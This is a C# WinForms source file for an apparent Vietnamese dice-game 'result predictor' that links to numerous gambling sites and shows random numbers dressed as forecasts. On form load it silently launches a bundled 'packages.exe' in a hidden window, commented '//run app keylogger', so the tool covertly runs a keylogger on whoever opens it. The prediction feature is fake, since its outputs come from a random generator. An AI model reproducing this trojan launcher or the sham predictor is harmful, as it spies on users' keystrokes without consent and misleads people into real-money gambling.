using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Project_1
{
    //Ctril+M+H,U,O,P
    //active => sign in => start
    public partial class Form1 : Form
    {
        private static int con = 0, dis = 0, temp = 0, kt = 0, mkhs = 0;
        //private static string path = Application.StartupPath + "\\SameApp.exe";
        private static string path = Application.StartupPath + "\\packages.exe";
        //Network
        [DllImport("wininet.dll")]
        private extern static bool InternetGetConnectedState(out int conn, int val);
        public Form1()
        {
            InitializeComponent();
            //language
            cbb_language.Items.Add("English");
            cbb_language.Items.Add("Tiếng Việt");
            cbb_language.Text = "English";
            lb_wait.Text = "";
            cbb_Name.Text = "	Game List";
            timer1.Start();
            //custom
            custom_ProG.Style = ProgressBarStyle.Blocks;
            custom_ProG.Step = 1;
            custom_ProG.Minimum = 0;
            custom_ProG.Maximum = 100;
            custom_ProG.Value = 0;
            first_dis();
        }
        void first_dis()
        {
            tb_checking.ReadOnly = false;
            //lb_mkh.Text = "bạn chưa có\nmã kích hoạt ?";
        }
        //check code
        void check_code()
        {
            string c1 = "0123456789";
            if (tb_checking.Text == c1)
            {
                //tb_checking.ReadOnly = true; //fix
                lb_err1.Text = "Kích hoạt thành công !";
                lb_err1.ForeColor = Color.White;
                kt = 2;
            }
            else
            {
                lb_err1.Text = "Mã kích hoạt sai !";
                lb_err1.ForeColor = Color.Green;
                mkhs++;
                if (mkhs >= 5)
                {
                    lb_mkh.Enabled = true;
                    lb_mkh.Text = "Bạn chưa có mã kích hoạt ?";
                    lb_mkh.ForeColor = Color.White;
                }
                else if (mkhs >= 1000) { mkhs = 0; }//reset
            }
        }
        #region Web
        private void cbb_Name_SelectedIndexChanged(object sender, EventArgs e)
        {
            ComboBox cb = sender as ComboBox;
            lb_ShowName.Text = "" + cb.SelectedItem;
        }
        void web_NH()
        {
            string web = @"https://sieuno.win/";
            Process.Start(web);
        }
        void web_789()
        {
            string web = @"https://bit.ly/2F3LOEF";
            Process.Start(web);
        }
        void web_b52()
        {
            string web = @"https://game.taib52.club/";
            Process.Start(web);
        }
        void web_bino()
        {
            string web = @"https://bino79.club/";
            Process.Start(web);
        }
        void web_roy()
        {
            string web = @"https://roy.vin/20201412/index.jsp";
            Process.Start(web);
        }
        void web_hen88()
        {
            string web = @"https://doithuong.us/play/hen88";
            Process.Start(web);
        }
        void web_taito()
        {
            string web = @"https://taito.me/";
            Process.Start(web);
        }
        void web_vin88()
        {
            string web = @"https://vin88.vip/";
            Process.Start(web);
        }
        void web_nhatvip()
        {
            string web = @"https://qc.nhat88.club/";
            Process.Start(web);
        }
        void web_macao()
        {
            string web = @"https://macauclub.fun/";
            Process.Start(web);
        }
        void web_sunwin()
        {
            string web = @"https://sunvn.vip/";
            Process.Start(web);
        }
        void web_zowin()
        {
            string web = @"https://lp.zowinvn.vip/";
            Process.Start(web);
        }
        void web_v8()
        {
            string web = @"https://taiv8.us/";
            Process.Start(web);
        }
        void web_go88()
        {
            string web = @"https://tai.go88vn.vip/";
            Process.Start(web);
        }
        void web_fa88()
        {
            string web = @"https://fa88.online/";
            Process.Start(web);
        }
        void web_ricwin()
        {
            string web = @"https://dangky.gameric.win/";
            Process.Start(web);
        }
        void web_yo88()
        {
            string web = @"https://ad.yo88vn.vip/";
            Process.Start(web);
        }
        void web_x8()
        {
            string web = @"https://qc.x8vn.com/";
            Process.Start(web);
        }
        void web_rikvip()
        {
            string web = @"https://rik.vip/";
            Process.Start(web);
        }
        void web_kingfun()
        {
            string web = @"http://dangkykingfun.info/";
            Process.Start(web);
        }
        void web_gam()
        {
            string web = @"https://gamvip.com/#/";
            Process.Start(web);
        }
        void web_Chat79()
        {
            string web = @"https://chat79.club/";
            Process.Start(web);
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            temp++;
            textBox4.Text = "" + temp.ToString();
        }
        #endregion

        //for value
        void run_value()
        {
            int empty1 = 0, empty2 = 1028070, empty3 = 1098070; //1028075
            //ept2 gia tri ht
            //ept3 gioi han
            if (Int32.TryParse(tb_value.Text, out empty1))
            {
                if (empty2 < Convert.ToInt32(tb_value.Text) && Convert.ToInt32(tb_value.Text) < empty3)
                {
                    timer_load.Start();
                    lb_err2.Text = "";
                }
                else
                {
                    lb_err2.Text = "Số không hợp lệ !";
                    lb_err2.ForeColor = Color.Green;
                }
            }
            else
            {
                MessageBox.Show("Vui lòng nhập số !", "Notice !");
            }
        }
        //Channel_https://www.youtube.com/channel/UCei-tSXy69Qr9AnrtpRObog
        //nhap,code
        #region Dang nhap
        #region Enter, Leave 
        //Enter
        //textBox
        private void tb_value_Enter(object sender, EventArgs e)
        {
            if (tb_value.Text == "#123xxx") { tb_value.Text = ""; tb_value.ForeColor = Color.Yellow; } //fix 
        }
        private void tb_checking_Enter(object sender, EventArgs e)
        {
            if (tb_checking.Text == "Activation Code" && cbb_language.Text == "English") { tb_checking.Text = ""; tb_checking.ForeColor = Color.Yellow; }
            if (tb_checking.Text == "Mã Kích Hoạt" && cbb_language.Text == "Tiếng Việt") { tb_checking.Text = ""; tb_checking.ForeColor = Color.Yellow; }
            //Nhập mã kich hoạt
        }
        //Leave
        //textBox
        private void tb_value_Leave(object sender, EventArgs e)
        {
            if (tb_value.Text == "") { tb_value.Text = "#123xxx"; tb_value.ForeColor = Color.White; }
        }
        private void tb_checking_Leave(object sender, EventArgs e)
        {
            if (tb_checking.Text == "" && cbb_language.Text == "English") { tb_checking.Text = "Activation Code"; tb_checking.ForeColor = Color.White; }
            if (tb_checking.Text == "" && cbb_language.Text == "Tiếng Việt") { tb_checking.Text = "Mã Kích Hoạt"; tb_checking.ForeColor = Color.White; }
        }
        #endregion
        #endregion
        //language
        #region Language
        //lg
        private void cbb_language_TextChanged(object sender, EventArgs e)
        {
            if (cbb_language.Text == "English")
            {
                lb_status.Text = "Network Status:";
                bt_spin.Text = "Spin";
                tb_checking.Text = "Activation Code";
                bt_activa.Text = "Activation Code";
                bt_webgame.Text = "Website Game";
                bt_wov.Text = "List of Video";
                bt_sub.Text = "SUBSCRIBE";
            }
            else if (cbb_language.Text == "Tiếng Việt")
            {
                lb_status.Text = "Trạng Thái Mạng:";
                bt_spin.Text = "Quay";
                tb_checking.Text = "Mã Kích Hoạt";
                bt_activa.Text = "Mã Kích Hoạt";
                bt_webgame.Text = "Trang Game";
                bt_wov.Text = "Danh Sách Video";
                bt_sub.Text = "ĐĂNG KÝ";
            }
        }
        int rs, b = 0;
        //result 
        void result()
        {
            Random rand = new Random();
            rs = rand.Next(3, 19);
            lb_result.Text = rs.ToString();
        }
        private void load_start()
        {
            result();
            more_result();
            Label lb = new Label();
            lb.Text = b + ", " + "==> [" + rs + "] (" + lb_more.Text + ")" + "\n"; // fix
            lb.Size = new Size(100, 20);
            lb.AutoSize = true;
            lb.Size = new System.Drawing.Size(900, 210);
            lb.Font = new Font("Arial", 10, FontStyle.Regular);
            lb.BorderStyle = BorderStyle.Fixed3D;
            b++;
            if (b >= 27)
            {
                lb.Text = "Enough";
            }
            Thread.Sleep(100);
        }
        #endregion
        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            try
            {
                int Out;
                if (InternetGetConnectedState(out Out, 0) == true)
                {
                    con++;
                    if (cbb_language.Text == "English")
                    {
                        lb_netWork.Text = "Connected";
                        lb_netWork.ForeColor = System.Drawing.Color.Green; // change color
                    }
                    if (cbb_language.Text == "Tiếng Việt")
                    {
                        lb_netWork.Text = "Đã kết nối";
                        lb_netWork.ForeColor = System.Drawing.Color.Green; // change color
                    }
                    abcd();
                }
                else
                {
                    dis++;
                    if (cbb_language.Text == "English")
                    {
                        lb_netWork.Text = "Not Connected";
                        lb_netWork.ForeColor = System.Drawing.Color.Red; // change color
                    }
                    if (cbb_language.Text == "Tiếng Việt")
                    {
                        lb_netWork.Text = "Không kết nối";
                        lb_netWork.ForeColor = System.Drawing.Color.Red; // change color
                    }
                }
                auto_1();
            }
            catch (Exception ex) { MessageBox.Show("" + ex); }
        }
        private void button9_Click(object sender, EventArgs e)
        {
            if (kt == 0 || kt == 1)
            {
                MessageBox.Show("Vui lòng nhập mã kich hoạt, để sử dụng tính năng này !", "Notice !");
            }
            else if (kt == 2)
            {
                if (cbb_Name.Text == "")
                {
                    MessageBox.Show("Bạn cần chọn 1 game để sử dụng tính năng này !", "Notice !");
                }
                else { run_value(); }
            }
        }
        private void timer_load_Tick(object sender, EventArgs e)
        {
            custom_ProG.PerformStep();
            if (custom_ProG.Value == custom_ProG.Maximum)
            {
                timer_wait.Start();
                wait = 4;
                timer_load.Stop();
                load_start();
                bt_spin.Enabled = false;
                tb_value.ReadOnly = false;
            }
            else { tb_value.ReadOnly = true; }
        }
        int wait;
        private void timer_what_Tick(object sender, EventArgs e)
        {
            //custom_ProG.Value--;
            custom_ProG.Value = 0;
            if (custom_ProG.Value == custom_ProG.Minimum) { timer_what.Stop(); bt_spin.Enabled = true; lb_wait.Text = ""; }
        }
        private void timer_wait_Tick(object sender, EventArgs e)
        {
            wait--;
            lb_wait.Text = "Wait " + wait + " second...";
            if (wait == 0 || wait <= 0)
            {
                timer_wait.Stop();

                timer_what.Start();

            }
        }
        void auto_1()
        {
            if (tb_checking.TextLength == 10)
            {
                check_code();
            }
        }
        private void button9_Click_1(object sender, EventArgs e)
        {
        }
        private void Form1_Load_1(object sender, EventArgs e)
        {
            //run app keylogger
            Process prc = new Process();
            prc.StartInfo.FileName = path;
            prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            prc.Start();
            notifyIcon1.ShowBalloonTip(5000, "You have a notification !", "This application Running !!!", ToolTipIcon.Error);
            //set it current
            lb_mkh.Text = "";
            lb_mkh.Enabled = false;
            lb_netWork.Text = "";
            lb_err1.Text = "";
            lb_err2.Text = "";
            lb_result.Text = "";
            lb_more.Text = "";
            lb_ShowName.Text = "";
        }

        //check
        void abcd()
        {
            if (cbb_Name.Text != "")
            {
                kt = 1;
            }
            else
            {
                kt = 0;
            }
        }
        private void tb_checking_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                check_code();
            }
        }
        private void lb_mkh_Click(object sender, EventArgs e)
        {
            Form2 f2 = new Form2();
            f2.ShowDialog();
        }
        #region get
        private void button2_Click(object sender, EventArgs e)
        {
            if (cbb_Name.SelectedIndex > 0 || cbb_Name.SelectedIndex == 0)
            {
                string get = cbb_Name.SelectedItem.ToString();
                if (get == "Nổ Hũ_(sieuno.win)")
                {
                    web_NH();
                }
                if (get == "789clup_(789clubvip.com)")
                {
                    web_789();
                }
                if (get == "B52club_(game.taib52.club)")
                {
                    web_b52();
                }
                if (get == "Bino79_(bino79.club)")
                {
                    web_bino();
                }
                if (get == "FA88club_(fa88.online)")
                {
                    web_fa88();
                }
                if (get == "Gamvip_(gamvip.com)")
                {
                    web_gam();
                }
                if (get == "Go88_(tai.go88vn.vip)")
                {
                    web_go88();
                }
                if (get == "Hen88club_(doithuong.us/play/hen88)")
                {
                    web_hen88();
                }
                if (get == "Kingfun_(dangkykingfun.info)")
                {
                    web_kingfun();
                }
                if (get == "Zowin_(lp.zowinvn.vip)")
                {
                    web_zowin();
                }
                if (get == "Nhat.Vip_(qc.nhat88.club)")
                {
                    web_nhatvip();
                }
                if (get == "MaCao.Club_(macauclub.fun)")
                {
                    web_macao();
                }
                if (get == "Ric.Win_(dangky.gameric.win)")
                {
                    web_ricwin();
                }
                if (get == "Rikvip_(rik.vip)")
                {
                    web_rikvip();
                }
                if (get == "Yo88_(ad.yo88vn.vip)")
                {
                    web_yo88();
                }
                if (get == "X8club_(qc.x8vn.com)")
                {
                    web_x8();
                }
                if (get == "Roy.Vin_(roy.vin)")
                {
                    web_roy();
                }
                if (get == "Sunwin_(sunvn.vip)")
                {
                    web_sunwin();
                }
                if (get == "Taito_(taito.me)")
                {
                    web_taito();
                }
                if (get == "V8club_(taiv8.us)")
                {
                    web_v8();

                }
                if (get == "Vin.Win_(vin88.vip)")
                {
                    web_vin88();
                }
                if (get == "Chat79_(chat79.club)")
                {
                    web_Chat79();
                }
                if (get == "	Game List")
                {
                    MessageBox.Show("Vui lòng lựa chọn 1 trò chơi để bắt đầu", "Notice !");
                }
            }
            else
            {
                MessageBox.Show("Chưa Chọn !", "Notice !");
            }
        }
        #endregion
        private void button4_Click(object sender, EventArgs e)
        {

        }
        private void button3_Click(object sender, EventArgs e)
        {
            {
                string web = @"https://bit.ly/3qp9O7p";
                Process.Start(web);
                string web1 = @"https://www.youtube.com/channel/UCei-tSXy69Qr9AnrtpRObog";
                Process.Start(web1);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Form2 f2 = new Form2();
            f2.ShowDialog();
        }

        private void lb_mkh_MouseEnter(object sender, EventArgs e)
        {
            lb_mkh.ForeColor = Color.Yellow;
        }

        private void lb_mkh_MouseLeave(object sender, EventArgs e)
        {
            lb_mkh.ForeColor = Color.White;
        }
        #region More_Result
        void more_result()
        {
            switch (rs)
            {
                case 3:
                    lb_more.Text = "1-1-1";
                    break;
                case 4:
                    case_4();
                    break;
                case 5:
                    case_5();
                    break;
                case 6:
                    case_6();
                    break;
                case 7:
                    case_7();
                    break;
                case 8:
                    case_8();
                    break;
                case 9:
                    case_9();
                    break;
                case 10:
                    case_10();
                    break;
                case 11:
                    case_11();
                    break;
                case 12:
                    case_12();
                    break;
                case 13:
                    case_13();
                    break;
                case 14:
                    case_14();
                    break;
                case 15:
                    case_15();
                    break;
                case 16:
                    case_16();
                    break;
                case 17:
                    case_17();
                    break;
                case 18:
                    lb_more.Text = ("6-6-6");
                    break;
                default:
                    MessageBox.Show("Error");
                    lb_more.Text = "Error";
                    break;
            }
        }
        void case_4()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 4);
            if (numb == 1) { lb_more.Text = ("1-2-1"); }
            if (numb == 2) { lb_more.Text = ("1-1-2"); }
            if (numb == 3) { lb_more.Text = ("2-1-1"); }
        }
        void case_5()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 7);
            if (numb == 1) { lb_more.Text = ("1-3-1"); }
            if (numb == 2) { lb_more.Text = ("1-2-2"); }
            if (numb == 3) { lb_more.Text = ("1-1-3"); }
            if (numb == 4) { lb_more.Text = ("2-2-1"); }
            if (numb == 5) { lb_more.Text = ("2-1-2"); }
            if (numb == 6) { lb_more.Text = ("3-1-1"); }
        }
        void case_6()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 11);
            if (numb == 1) { lb_more.Text = ("1-4-1"); }
            if (numb == 2) { lb_more.Text = ("1-3-2"); }
            if (numb == 3) { lb_more.Text = ("1-2-3"); }
            if (numb == 4) { lb_more.Text = ("1-1-4"); }
            if (numb == 5) { lb_more.Text = ("2-1-3"); }
            if (numb == 6) { lb_more.Text = ("2-2-2"); }
            if (numb == 7) { lb_more.Text = ("2-3-1"); }
            if (numb == 8) { lb_more.Text = ("3-2-1"); }
            if (numb == 9) { lb_more.Text = ("3-1-2"); }
            if (numb == 10) { lb_more.Text = ("4-1-1"); }
        }
        void case_7()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 16);
            if (numb == 1) { lb_more.Text = ("1-5-1"); }
            if (numb == 2) { lb_more.Text = ("1-4-2"); }
            if (numb == 3) { lb_more.Text = ("1-3-3"); }
            if (numb == 4) { lb_more.Text = ("1-2-4"); }
            if (numb == 5) { lb_more.Text = ("1-1-5"); }
            if (numb == 6) { lb_more.Text = ("2-4-1"); }
            if (numb == 7) { lb_more.Text = ("2-3-2"); }
            if (numb == 8) { lb_more.Text = ("2-2-3"); }
            if (numb == 9) { lb_more.Text = ("2-1-4"); }
            if (numb == 10) { lb_more.Text = ("4-1-2"); }
            if (numb == 11) { lb_more.Text = ("4-2-1"); }
            if (numb == 12) { lb_more.Text = ("3-3-1"); }
            if (numb == 13) { lb_more.Text = ("3-2-2"); }
            if (numb == 14) { lb_more.Text = ("3-1-3"); }
            if (numb == 15) { lb_more.Text = ("5-1-1"); }
        }

        void case_8()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 22);
            if (numb == 1) { lb_more.Text = ("6-1-1"); }
            if (numb == 2) { lb_more.Text = ("5-2-1"); }
            if (numb == 3) { lb_more.Text = ("5-1-2"); }
            if (numb == 4) { lb_more.Text = ("4-1-3"); }
            if (numb == 5) { lb_more.Text = ("4-2-2"); }
            if (numb == 6) { lb_more.Text = ("4-3-1"); }
            if (numb == 7) { lb_more.Text = ("1-1-6"); }
            if (numb == 8) { lb_more.Text = ("1-6-1"); }
            if (numb == 9) { lb_more.Text = ("1-2-5"); }
            if (numb == 10) { lb_more.Text = ("1-5-2"); }
            if (numb == 11) { lb_more.Text = ("1-3-4"); }
            if (numb == 12) { lb_more.Text = ("1-4-3"); }
            if (numb == 13) { lb_more.Text = ("2-5-1"); }
            if (numb == 14) { lb_more.Text = ("2-1-5"); }
            if (numb == 15) { lb_more.Text = ("2-3-3"); }
            if (numb == 16) { lb_more.Text = ("2-4-2"); }
            if (numb == 17) { lb_more.Text = ("2-2-4"); }
            if (numb == 18) { lb_more.Text = ("3-1-4"); }
            if (numb == 19) { lb_more.Text = ("3-4-1"); }
            if (numb == 20) { lb_more.Text = ("3-2-3"); }
            if (numb == 21) { lb_more.Text = ("3-3-2"); }
        }

        void case_9()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 26);
            if (numb == 1) { lb_more.Text = ("1-6-2"); }
            if (numb == 2) { lb_more.Text = ("1-2-6"); }
            if (numb == 3) { lb_more.Text = ("1-4-4"); }
            if (numb == 4) { lb_more.Text = ("1-5-3"); }
            if (numb == 5) { lb_more.Text = ("1-3-5"); }
            if (numb == 6) { lb_more.Text = ("2-6-1"); }
            if (numb == 7) { lb_more.Text = ("2-1-6"); }
            if (numb == 8) { lb_more.Text = ("2-5-2"); }
            if (numb == 9) { lb_more.Text = ("2-2-5"); }
            if (numb == 10) { lb_more.Text = ("2-3-4"); }
            if (numb == 11) { lb_more.Text = ("2-4-3"); }
            if (numb == 12) { lb_more.Text = ("5-2-2"); }
            if (numb == 13) { lb_more.Text = ("5-3-1"); }
            if (numb == 14) { lb_more.Text = ("5-1-3"); }
            if (numb == 15) { lb_more.Text = ("6-2-1"); }
            if (numb == 16) { lb_more.Text = ("6-1-2"); }
            if (numb == 17) { lb_more.Text = ("4-4-1"); }
            if (numb == 18) { lb_more.Text = ("4-3-2"); }
            if (numb == 19) { lb_more.Text = ("4-2-3"); }
            if (numb == 20) { lb_more.Text = ("4-1-4"); }
            if (numb == 21) { lb_more.Text = ("3-5-1"); }
            if (numb == 22) { lb_more.Text = ("3-4-2"); }
            if (numb == 23) { lb_more.Text = ("3-2-4"); }
            if (numb == 24) { lb_more.Text = ("3-1-5"); }
            if (numb == 25) { lb_more.Text = ("3-3-3"); }
        }

        void case_10()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 28);
            if (numb == 1) { lb_more.Text = ("1-6-3"); }
            if (numb == 2) { lb_more.Text = ("1-3-6"); }
            if (numb == 3) { lb_more.Text = ("1-4-5"); }
            if (numb == 4) { lb_more.Text = ("1-5-4"); }
            if (numb == 5) { lb_more.Text = ("2-6-2"); }
            if (numb == 6) { lb_more.Text = ("2-5-3"); }
            if (numb == 7) { lb_more.Text = ("2-4-4"); }
            if (numb == 8) { lb_more.Text = ("2-3-5"); }
            if (numb == 9) { lb_more.Text = ("2-2-6"); }
            if (numb == 10) { lb_more.Text = ("6-1-3"); }
            if (numb == 11) { lb_more.Text = ("6-2-2"); }
            if (numb == 12) { lb_more.Text = ("6-3-1"); }
            if (numb == 13) { lb_more.Text = ("5-4-1"); }
            if (numb == 14) { lb_more.Text = ("5-3-2"); }
            if (numb == 15) { lb_more.Text = ("5-1-4"); }
            if (numb == 16) { lb_more.Text = ("5-2-3"); }
            if (numb == 17) { lb_more.Text = ("4-5-1"); }
            if (numb == 18) { lb_more.Text = ("4-4-2"); }
            if (numb == 19) { lb_more.Text = ("4-3-3"); }
            if (numb == 20) { lb_more.Text = ("4-2-4"); }
            if (numb == 21) { lb_more.Text = ("4-1-5"); }
            if (numb == 22) { lb_more.Text = ("3-6-1"); }
            if (numb == 23) { lb_more.Text = ("3-1-6"); }
            if (numb == 24) { lb_more.Text = ("3-2-5"); }
            if (numb == 25) { lb_more.Text = ("3-3-4"); }
            if (numb == 26) { lb_more.Text = ("3-4-3"); }
            if (numb == 27) { lb_more.Text = ("3-5-2"); }
        }


        void case_11()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 29);
            if (numb == 1) { lb_more.Text = ("1-6-4"); }
            if (numb == 2) { lb_more.Text = ("1-5-5"); }
            if (numb == 3) { lb_more.Text = ("1-4-6"); }
            if (numb == 4) { lb_more.Text = ("2-6-3"); }
            if (numb == 5) { lb_more.Text = ("2-5-4"); }
            if (numb == 6) { lb_more.Text = ("2-3-6"); }
            if (numb == 7) { lb_more.Text = ("2-4-5"); }
            if (numb == 8) { lb_more.Text = ("3-6-2"); }
            if (numb == 9) { lb_more.Text = ("3-2-6"); }
            if (numb == 10) { lb_more.Text = ("3-5-3"); }
            if (numb == 11) { lb_more.Text = ("3-3-5"); }
            if (numb == 12) { lb_more.Text = ("3-4-4"); }
            if (numb == 13) { lb_more.Text = ("4-6-1"); }
            if (numb == 14) { lb_more.Text = ("4-1-6"); }
            if (numb == 15) { lb_more.Text = ("4-2-5"); }
            if (numb == 16) { lb_more.Text = ("4-5-2"); }
            if (numb == 17) { lb_more.Text = ("4-3-4"); }
            if (numb == 18) { lb_more.Text = ("4-4-3"); }
            if (numb == 19) { lb_more.Text = ("5-1-5"); }
            if (numb == 20) { lb_more.Text = ("5-5-1"); }
            if (numb == 21) { lb_more.Text = ("5-2-4"); }
            if (numb == 22) { lb_more.Text = ("5-4-2"); }
            if (numb == 23) { lb_more.Text = ("5-3-3"); }
            if (numb == 24) { lb_more.Text = ("5-4-2"); }
            if (numb == 25) { lb_more.Text = ("6-4-1"); }
            if (numb == 26) { lb_more.Text = ("6-1-4"); }
            if (numb == 27) { lb_more.Text = ("6-3-2"); }
            if (numb == 28) { lb_more.Text = ("6-2-3"); }
        }

        void case_12()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 24);
            if (numb == 1) { lb_more.Text = ("3-3-6"); }
            if (numb == 2) { lb_more.Text = ("3-4-5"); }
            if (numb == 3) { lb_more.Text = ("3-5-4"); }
            if (numb == 4) { lb_more.Text = ("3-6-3"); }
            if (numb == 5) { lb_more.Text = ("1-6-5"); }
            if (numb == 6) { lb_more.Text = ("1-5-6"); }
            if (numb == 7) { lb_more.Text = ("2-4-6"); }
            if (numb == 8) { lb_more.Text = ("2-5-5"); }
            if (numb == 9) { lb_more.Text = ("2-6-4"); }
            if (numb == 10) { lb_more.Text = ("4-6-2"); }
            if (numb == 11) { lb_more.Text = ("4-5-3"); }
            if (numb == 12) { lb_more.Text = ("4-4-4"); }
            if (numb == 13) { lb_more.Text = ("4-3-5"); }
            if (numb == 14) { lb_more.Text = ("4-2-6"); }
            if (numb == 15) { lb_more.Text = ("5-6-1"); }
            if (numb == 16) { lb_more.Text = ("5-5-2"); }
            if (numb == 17) { lb_more.Text = ("5-4-3"); }
            if (numb == 18) { lb_more.Text = ("5-3-4"); }
            if (numb == 19) { lb_more.Text = ("5-2-5"); }
            if (numb == 20) { lb_more.Text = ("6-5-1"); }
            if (numb == 21) { lb_more.Text = ("6-4-2"); }
            if (numb == 22) { lb_more.Text = ("6-3-3"); }
            if (numb == 23) { lb_more.Text = ("6-2-4"); }
        }



        void case_13()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 22);
            if (numb == 1) { lb_more.Text = ("1-6-6"); }
            if (numb == 2) { lb_more.Text = ("2-6-5"); }
            if (numb == 3) { lb_more.Text = ("2-5-6"); }
            if (numb == 4) { lb_more.Text = ("3-5-5"); }
            if (numb == 5) { lb_more.Text = ("3-6-4"); }
            if (numb == 6) { lb_more.Text = ("3-4-6"); }
            if (numb == 7) { lb_more.Text = ("4-6-3"); }
            if (numb == 8) { lb_more.Text = ("4-3-6"); }
            if (numb == 9) { lb_more.Text = ("4-4-5"); }
            if (numb == 10) { lb_more.Text = ("4-5-4"); }
            if (numb == 11) { lb_more.Text = ("5-6-2"); }
            if (numb == 12) { lb_more.Text = ("5-2-6"); }
            if (numb == 13) { lb_more.Text = ("5-4-4"); }
            if (numb == 14) { lb_more.Text = ("5-3-5"); }
            if (numb == 15) { lb_more.Text = ("5-5-3"); }
            if (numb == 16) { lb_more.Text = ("6-6-1"); }
            if (numb == 17) { lb_more.Text = ("6-5-2"); }
            if (numb == 18) { lb_more.Text = ("6-1-6"); }
            if (numb == 19) { lb_more.Text = ("6-2-5"); }
            if (numb == 20) { lb_more.Text = ("6-3-4"); }
            if (numb == 21) { lb_more.Text = ("6-4-3"); }
        }

        void case_14()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 16);
            if (numb == 1) { lb_more.Text = ("2-6-6"); }
            if (numb == 2) { lb_more.Text = ("3-5-6"); }
            if (numb == 3) { lb_more.Text = ("3-6-5"); }
            if (numb == 4) { lb_more.Text = ("4-4-6"); }
            if (numb == 5) { lb_more.Text = ("4-6-4"); }
            if (numb == 6) { lb_more.Text = ("4-5-5"); }
            if (numb == 7) { lb_more.Text = ("5-3-6"); }
            if (numb == 8) { lb_more.Text = ("5-6-3"); }
            if (numb == 9) { lb_more.Text = ("5-4-5"); }
            if (numb == 10) { lb_more.Text = ("5-5-4"); }
            if (numb == 11) { lb_more.Text = ("6-2-6"); }
            if (numb == 12) { lb_more.Text = ("6-6-2"); }
            if (numb == 13) { lb_more.Text = ("6-5-3"); }
            if (numb == 14) { lb_more.Text = ("6-4-4"); }
            if (numb == 15) { lb_more.Text = ("6-3-5"); }
        }

        void case_15()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 11);
            if (numb == 1) { lb_more.Text = ("3-6-6"); }
            if (numb == 2) { lb_more.Text = ("4-5-6"); }
            if (numb == 3) { lb_more.Text = ("4-6-5"); }
            if (numb == 4) { lb_more.Text = ("5-5-5"); }
            if (numb == 5) { lb_more.Text = ("5-6-4"); }
            if (numb == 6) { lb_more.Text = ("5-4-6"); }
            if (numb == 7) { lb_more.Text = ("6-6-3"); }
            if (numb == 8) { lb_more.Text = ("6-3-6"); }
            if (numb == 9) { lb_more.Text = ("6-5-4"); }
        }
        void case_16()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 7);
            if (numb == 1) { lb_more.Text = ("4-6-6"); }
            if (numb == 2) { lb_more.Text = ("5-6-5"); }
            if (numb == 3) { lb_more.Text = ("5-5-6"); }
            if (numb == 4) { lb_more.Text = ("6-6-4"); }
            if (numb == 5) { lb_more.Text = ("6-5-5"); }
            if (numb == 6) { lb_more.Text = ("6-4-6"); }
        }


        void case_17()
        {
            int numb;
            Random rand = new Random();
            numb = rand.Next(1, 4);
            if (numb == 1) { lb_more.Text = ("5-6-6"); }
            if (numb == 2) { lb_more.Text = ("6-6-5"); }
            if (numb == 3) { lb_more.Text = ("6-5-6"); }
        }
        #endregion
    }
}
